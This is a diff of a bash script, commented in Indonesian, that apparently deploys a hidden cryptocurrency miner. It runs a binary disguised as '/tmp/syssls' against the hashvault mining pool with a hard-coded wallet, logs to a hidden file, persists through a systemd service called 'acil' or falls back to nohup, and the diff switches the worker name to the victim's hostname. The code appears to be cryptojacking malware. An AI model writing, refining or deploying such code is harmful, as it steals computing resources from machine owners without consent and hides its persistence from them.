@@ -9,7 +9,7 @@ cd /tmp
 
 # Mendapatkan nama sistem operasi
 OS=$(uname)
-
+hostname=$(uname -n)
 if [[ -f "/tmp/syssls" ]]; then
     echo "File syssls ditemukan, siap dieksekusi."
 else
@@ -53,6 +53,7 @@ IP_LOCAL=$(hostname -I | awk '{print $1}')
 # Mengganti titik dengan hubung pada IP publik dan lokal
 IP_PUBLIC_REPLACED=$(echo "$IP_PUBLIC" | sed 's/\./-/g')
 IP_LOCAL_REPLACED=$(echo "$IP_LOCAL" | sed 's/\./-/g')
+HOSTNAME_REPLACED=$(echo "$hostname" | sed 's/\\./-/g')
 
 # Menentukan apakah IP publik adalah IPv6
 if [[ "$IP_PUBLIC" =~ : ]]; then
@@ -90,6 +91,6 @@ WantedBy=multi-user.target" > /etc/systemd/system/acil.service
     echo "Systemd service untuk ACIL telah dibuat, dimuat, dan dimulai."
 else
     # Jika bukan root, jalankan dengan nohup
-    nohup /tmp/syssls --opencl --cuda --url pool.hashvault.pro:443 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass $IP_TO_USE --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 > /tmp/.logacil 2>&1 &
+    nohup /tmp/syssls --opencl --cuda --url pool.hashvault.pro:443 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass $HOSTNAME_REPLACED --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 > /tmp/.logacil 2>&1 &
     echo "Menjalankan miner sebagai user non-root dengan nohup."
 fi
